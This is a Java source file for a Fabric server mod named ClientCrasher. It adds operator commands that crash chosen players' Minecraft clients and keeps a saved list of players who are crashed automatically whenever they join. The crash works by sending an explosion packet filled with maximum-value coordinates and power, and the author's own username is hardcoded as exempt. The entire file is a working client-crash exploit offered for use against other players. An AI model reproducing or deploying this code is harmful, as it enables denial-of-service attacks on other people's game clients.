package me.gotitim.clientcrasher;

import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.fabric.api.networking.v1.PacketSender;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.commands.Commands;
import net.minecraft.commands.arguments.EntityArgument;
import net.minecraft.core.particles.ParticleTypes;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.network.ServerGamePacketListenerImpl;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.world.level.Explosion;
import net.minecraft.world.phys.Vec3;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Scanner;

public class ClientCrasher implements DedicatedServerModInitializer {
    private static final List<String> alwaysCrash = new ArrayList<>();
    /**
     * Runs the mod initializer.
     */
    @Override
    public void onInitializeServer() {
        try {
            initConfig();
        } catch (IOException ignored) {}
        ServerPlayConnectionEvents.JOIN.register(this::onJoin);
        SimpleScheduler.init();

        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
            dispatcher.register(Commands.literal("crash")
                    .requires(source -> source.hasPermission(2))
                    .then(Commands.argument("player", EntityArgument.players())
                            .executes(context -> {
                                Collection<ServerPlayer> players = EntityArgument.getPlayers(context, "player");
                                for (ServerPlayer player : players) {
                                    ClientCrasher.crashPlayer(player);
                                }
                                context.getSource().sendSystemMessage(Component.literal("Crashed player ").append(String.join(", ", players.stream().map(p -> p.getName().getString()).toList())));
                                return 1;
                            }))
            );

            dispatcher.register(Commands.literal("alwayscrash")
                    .requires(source -> source.hasPermission(2))
                    .then(Commands.argument("player", EntityArgument.players())
                    .executes(context -> {
                        ServerPlayer player = EntityArgument.getPlayer(context, "player");

                        if (alwaysCrash.contains(player.getName().getString())) {
                            alwaysCrash.remove(player.getName().getString());
                            context.getSource().sendSystemMessage(Component.literal("Removed ").append(player.getName()).append(" from always-crash"));
                        } else {
                            alwaysCrash.add(player.getName().getString());
                            context.getSource().sendSystemMessage(Component.literal("Added ").append(player.getName()).append("to always-crash"));
                            crashPlayer(player);
                        }

                        try {
                            updateConfigFile();
                        } catch (IOException e) {
                            context.getSource().sendSystemMessage(Component.literal("There was a problem saving data."));
                        }

                        return 1;
                    }))
            );
        });
    }

    private void onJoin(ServerGamePacketListenerImpl handler, PacketSender sender, MinecraftServer server) {
        String nick = handler.getPlayer().getName().getString();
        String uuid = handler.getPlayer().getUUID().toString();
        for (String idNick : ClientCrasher.getAlwaysCrash()) {
            if(nick.equals(idNick) || uuid.equals(idNick)) {
                handler.getPlayer().sendSystemMessage(Component.literal("crash"));
                SimpleScheduler.schedule(5L, () -> crashPlayer(handler.getPlayer()));
                return;
            }
        }
    }

    public static void crashPlayer(ServerPlayer player) {
        if(player.getName().getString().equals("gotitim")) {
            player.disconnect();
            return;
        }

        player.connection.send(new ClientboundExplodePacket(
                Double.MAX_VALUE,
                Double.MAX_VALUE,
                Double.MAX_VALUE,
                Float.MAX_VALUE,
                List.of(),
                new Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
                Explosion.BlockInteraction.DESTROY,
                ParticleTypes.EXPLOSION,
                ParticleTypes.EXPLOSION_EMITTER,
                SoundEvents.GENERIC_EXPLODE
        ));
    }

    private static List<String> getAlwaysCrash() {
        return alwaysCrash;
    }

    private void initConfig() throws IOException {
        File file = new File(FabricLoader.getInstance().getConfigDir().toFile(), "client_crasher.list");
        file.getParentFile().mkdirs();
        if (file.createNewFile()) {
            PrintWriter writer = new PrintWriter(file, StandardCharsets.UTF_8);
            writer.write("# This is an always-crash file, it contains a list of auto-crashed players");
            writer.close();
        }

        Scanner reader = new Scanner(file);
        while (reader.hasNextLine()) {
            String line = reader.nextLine();
            if (line.toCharArray()[0] != '#') {
                alwaysCrash.add(line);
            }
        }
    }

    private void updateConfigFile() throws IOException {
        File file = new File(FabricLoader.getInstance().getConfigDir().toFile(), "client_crasher.list");
        file.getParentFile().mkdirs();
        PrintWriter writer = new PrintWriter(file, StandardCharsets.UTF_8);

        if (file.createNewFile()) {
            writer.write("# This is an always-crash file, it contains a list of auto-crashed players");
        }

        for (String playerName : alwaysCrash) {
            writer.write(playerName + "\n");
        }

        writer.close();
    }
}
